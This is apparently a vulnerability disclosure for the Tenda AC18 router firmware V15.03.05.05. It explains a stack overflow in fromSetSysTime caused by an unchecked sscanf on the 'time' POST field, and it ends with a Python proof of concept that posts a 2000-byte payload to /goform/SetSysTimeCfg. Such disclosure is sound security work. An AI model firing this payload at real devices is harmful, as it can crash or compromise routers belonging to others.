## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `fromSetSysTime` function. The `v20` variable receives the `time` parameter from a POST request and is assigned to `v7~v12` by `sscanf`. However, since the user can control the input of `time`, the statement `sscanf(v20, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s", v12, v11, v10, v9, v8, v7);` can cause a buffer overflow. The user-provided  `list` can exceed the capacity of the `v7~v12` array, triggering this security vulnerability.

![image-20240316222103120](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316222103120.png)

![image-20240316222047423](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316222047423.png)

![image-20240316222026197](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316222026197.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*2000

data = {
        'timeType':'manual',
        'time':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240316221759943](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316221759943.png)
